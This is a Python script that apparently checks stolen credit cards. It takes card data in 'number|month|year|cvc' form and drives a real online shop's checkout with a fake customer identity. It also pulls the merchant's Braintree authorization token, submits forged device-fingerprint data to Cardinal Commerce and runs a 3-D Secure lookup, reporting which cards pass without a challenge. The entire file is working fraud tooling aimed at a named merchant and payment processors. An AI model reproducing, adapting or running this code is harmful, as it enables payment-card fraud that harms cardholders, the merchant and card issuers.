import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
def vbv(ccx):
	import requests,re,base64,jwt,json
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r=requests.session()
	headers = {
	    'accept': '*/*',
	    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://shop.acumedic.com',
	    'phpr-event-handler': 'ev{onHandleRequest}',
	    'phpr-postback': '1',
	    'phpr-remote-event': '1',
	    'priority': 'u=1, i',
	    'referer': 'https://shop.acumedic.com/product/cup-gl4/',
	    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'cms_handler_name': 'shop:on_addToCart',
	    'ls_session_key': 'lsk6701abdc71e6b7.93568161',
	    'product_cart_quantity': '1',
	    'product_id': '143',
	}
	
	response = r.post('https://shop.acumedic.com/product/cup-gl4/', cookies=r.cookies, headers=headers, data=data)
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
	    'priority': 'u=0, i',
	    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'cross-site',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
	}
	
	response = r.get('http://shop.acumedic.com/checkout/%7ccheckout%7cbegin/', cookies=r.cookies, headers=headers, verify=False)
	headers = {
	    'accept': '*/*',
	    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://shop.acumedic.com',
	    'phpr-event-handler': 'ev{onHandleRequest}',
	    'phpr-postback': '1',
	    'phpr-remote-event': '1',
	    'priority': 'u=1, i',
	    'referer': 'https://shop.acumedic.com/checkout/%7ccheckout%7cbegin/',
	    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'cms_handler_name': 'on_action',
	    'ls_session_key': 'lsk6701ac1d9d8199.25515574',
	    'x_custaccgen_salutation': 'Mr',
	    'first_name': 'Christa',
	    'last_name': 'afadf',
	    'phone': '+16267958851',
	    'company': '',
	    'street_address': '1981 Jennifer Lane',
	    'city': 'Raleigh',
	    'zip': '10080',
	    'country': '1',
	    'state': '1',
	    'checkout__input--step-number': '1',
	    'checkout_step': 'billing_info',
	    'auto_skip_shipping': '1',
	    'register_customer': '1',
	    'customer_auto_login': '1',
	    'customer_registration_notification': '1',
	    'cms_update_elements[checkout__dynamic]': 'checkout:stepload',
	}
	
	response = r.post('https://shop.acumedic.com/checkout/', cookies=r.cookies, headers=headers, data=data)
	headers = {
	    'accept': '*/*',
	    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://shop.acumedic.com',
	    'phpr-event-handler': 'ev{onHandleRequest}',
	    'phpr-postback': '1',
	    'phpr-remote-event': '1',
	    'priority': 'u=1, i',
	    'referer': 'https://shop.acumedic.com/checkout/2/',
	    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'cms_handler_name': 'on_action',
	    'ls_session_key': 'lsk6701ac1d9d8199.25515574',
	    'first_name': 'Christa',
	    'last_name': 'afadf',
	    'phone': '+16267958851',
	    'company': '',
	    'street_address': '1981 Jennifer Lane',
	    'city': 'Raleigh',
	    'zip': '10080',
	    'country': '1',
	    'state': '1',
	    'checkout__input--step-number': '2',
	    'checkout_step': 'shipping_info',
	    'auto_skip_shipping': '1',
	    'register_customer': '1',
	    'customer_auto_login': '1',
	    'customer_registration_notification': '1',
	    'cms_update_elements[checkout__dynamic]': 'checkout:stepload',
	}
	
	response = r.post('https://shop.acumedic.com/checkout', cookies=r.cookies, headers=headers, data=data)
	headers = {
	    'accept': '*/*',
	    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://shop.acumedic.com',
	    'phpr-event-handler': 'ev{onHandleRequest}',
	    'phpr-postback': '1',
	    'phpr-remote-event': '1',
	    'priority': 'u=1, i',
	    'referer': 'https://shop.acumedic.com/checkout/3/',
	    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'cms_handler_name': 'on_action',
	    'ls_session_key': 'lsk6701ac1d9d8199.25515574',
	    'shipping_option': '44_7a3074fcf359c7dd8e12787ff21d8bd8',
	    'customer_notes': '',
	    'checkout__input--step-number': '3',
	    'checkout_step': 'shipping_method',
	    'auto_skip_shipping': '1',
	    'register_customer': '1',
	    'customer_auto_login': '1',
	    'customer_registration_notification': '1',
	    'cms_update_elements[checkout__dynamic]': 'checkout:stepload',
	}
	
	response = r.post('https://shop.acumedic.com/checkout', cookies=r.cookies, headers=headers, data=data)
	no = (re.search(r'name="client_token" value="(.*?)"', response.text).group(1))
	encoded_text = no
	decoded_text = base64.b64decode(encoded_text).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
	import requests
	headers = {
			    'accept': '*/*',
	    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://shop.acumedic.com',
	    'priority': 'u=1, i',
	    'referer': 'https://shop.acumedic.com/checkout/4/',
	    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
	}
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'dddf1086-222a-49b8-9557-4e456831961e',
	    },
	    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
	    'operationName': 'ClientConfiguration',
	}
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	cardnal=response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
	import requests
	headers = {
			    'accept': '*/*',
	    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/json;charset=UTF-8',
	    'origin': 'https://shop.acumedic.com',
	    'priority': 'u=1, i',
	    'referer': 'https://shop.acumedic.com/checkout/complete/a2178f49eb3287021ebb8ce6439aa70e4c2561921b79e5d6870123bc3a26f45f/',
	    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
	    'x-cardinal-tid': 'Tid-cd0d4581-dc53-4139-9fb4-7b806cae2608',
	}
	json_data = {
	    'BrowserPayload': {
	        'Order': {
	            'OrderDetails': {},
	            'Consumer': {
	                'BillingAddress': {},
	                'ShippingAddress': {},
	                'Account': {},
	            },
	            'Cart': [],
	            'Token': {},
	            'Authorization': {},
	            'Options': {},
	            'CCAExtension': {},
	        },
	        'SupportsAlternativePayments': {
	            'cca': True,
	            'hostedFields': False,
	            'applepay': False,
	            'discoverwallet': False,
	            'wallet': False,
	            'paypal': False,
	            'visacheckout': False,
	        },
	    },
	    'Client': {
	        'Agent': 'SongbirdJS',
	        'Version': '1.35.0',
	    },
	    'ConsumerSessionId': '0_6a562e6f-462f-4b57-ab53-5785d0e6adc6',
	    'ServerJWT': cardnal,
	}
	response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
	payload = response.json()['CardinalJWT']
	payload_dict = jwt.decode(payload, options={"verify_signature": False})
	reference_id = payload_dict['ReferenceId']
	import requests
	headers = {
	    'accept': '*/*',
	    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/json',
	    'origin': 'https://geo.cardinalcommerce.com',
	    'priority': 'u=1, i',
	    'referer': 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5c8a9893adb1562e003c26a6&tmEventType=PAYMENT&referenceId=0_6a562e6f-462f-4b57-ab53-5785d0e6adc6&geolocation=false&origin=Songbird',
	    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	json_data = {
	    'Cookies': {
	        'Legacy': True,
	        'LocalStorage': True,
	        'SessionStorage': True,
	    },
	    'DeviceChannel': 'Browser',
	    'Extended': {
	        'Browser': {
	            'Adblock': True,
	            'AvailableJsFonts': [],
	            'DoNotTrack': 'unknown',
	            'JavaEnabled': False,
	        },
	        'Device': {
	            'ColorDepth': 24,
	            'Cpu': 'unknown',
	            'Platform': 'Win32',
	            'TouchSupport': {
	                'MaxTouchPoints': 0,
	                'OnTouchStartAvailable': False,
	                'TouchEventCreationSuccessful': False,
	            },
	        },
	    },
	    'Fingerprint': 'acc338df9d5011edd298a653f431559f',
	    'FingerprintingTime': 1305,
	    'FingerprintDetails': {
	        'Version': '1.5.1',
	    },
	    'Language': 'ar',
	    'Latitude': None,
	    'Longitude': None,
	    'OrgUnitId': '5c8a9893adb1562e003c26a6',
	    'Origin': 'Songbird',
	    'Plugins': [
	        'PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
	        'Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
	        'Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
	        'Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
	        'WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
	    ],
	    'ReferenceId': reference_id,
	    'Referrer': 'https://shop.acumedic.com/checkout/4/',
	    'Screen': {
	        'FakedResolution': False,
	        'Ratio': 1.7777777777777777,
	        'Resolution': '1920x1080',
	        'UsableResolution': '1920x1040',
	        'CCAScreenSize': '02',
	    },
	    'CallSignEnabled': None,
	    'ThreatMetrixEnabled': False,
	    'ThreatMetrixEventType': 'PAYMENT',
	    'ThreatMetrixAlias': 'Default',
	    'TimeOffset': -180,
	    'UserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
	    'UserAgentDetails': {
	        'FakedOS': False,
	        'FakedBrowser': False,
	    },
	    'BinSessionId': '40c91fc8-9c62-402e-85f0-3f139e280f84',
	}
	response = r.post(
	    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
	    headers=headers,
	    json=json_data,
	)
	import requests
	headers = {
			    'accept': '*/*',
	    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'priority': 'u=1, i',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
	}
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'dropin2',
	        'sessionId': '0a9362cd-c09f-42ff-864a-c881c8fa39ef',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	import requests
	headers = {
			    'accept': '*/*',
	    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/json',
	    'origin': 'https://shop.acumedic.com',
	    'priority': 'u=1, i',
	    'referer': 'https://shop.acumedic.com/checkout/4/',
	    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
	}
	json_data = {
	    'amount': '14.95',
	    'browserColorDepth': 24,
	    'browserJavaEnabled': False,
	    'browserJavascriptEnabled': True,
	    'browserLanguage': 'ar',
	    'browserScreenHeight': 1080,
	    'browserScreenWidth': 1920,
	    'browserTimeZone': -180,
	    'deviceChannel': 'Browser',
	    'additionalInfo': {
	        'workPhoneNumber': None,
	        'shippingGivenName': 'Christa',
	        'shippingSurname': 'Christa',
	        'shippingPhone': '+16267958851',
	        'acsWindowSize': '03',
	        'billingLine1': '1981 Jennifer Lane',
	        'billingLine2': None,
	        'billingCity': 'Raleigh',
	        'billingState': 'AL',
	        'billingPostalCode': '10080',
	        'billingCountryCode': 'US',
	        'billingPhoneNumber': '+16267958851',
	        'billingGivenName': 'Christa',
	        'billingSurname': 'afadf',
	        'shippingLine1': '1981 Jennifer Lane',
	        'shippingLine2': None,
	        'shippingCity': 'Raleigh',
	        'shippingState': 'AL',
	        'shippingPostalCode': '10080',
	        'shippingCountryCode': 'US',
	        'email': 'adfeaqfa@gmail.com',
	    },
	    'bin': '435142',
	    'dfReferenceId': reference_id,
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.99.0',
	        'cardinalDeviceDataCollectionTimeElapsed': 395,
	        'issuerDeviceDataCollectionTimeElapsed': 3789,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': au,
	    'braintreeLibraryVersion': 'braintree/web/3.99.0',
	    '_meta': {
	        'merchantAppId': 'shop.acumedic.com',
	        'platform': 'web',
	        'sdkVersion': '3.99.0',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': '0a9362cd-c09f-42ff-864a-c881c8fa39ef',
	    },
	}
	response = r.post(
    f'https://api.braintreegateway.com/merchants/msf5rf5mg5f3y6fy/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)

	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	
	if 'authenticate_successful' in vbv:
	       return '3DS Authenticate Successful ✅ '
	elif 'challenge_required' in vbv:
	       return '3DS Challenge Required ❌'
	elif 'authenticate_attempt_successful' in vbv:
	       return '3DS Authenticate Attempt Successful ✅'
	elif 'authenticate_rejected' in vbv:
	       return '3DS Authenticate Rejected ❌'
	elif 'authenticate_frictionless_failed' in vbv:
	       return '3DS Authenticate Frictionless Failed ❌'
	elif 'lookup_card_error' in vbv:
	       return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
	       return 'Unknown Error ⚠️'
	return vbv
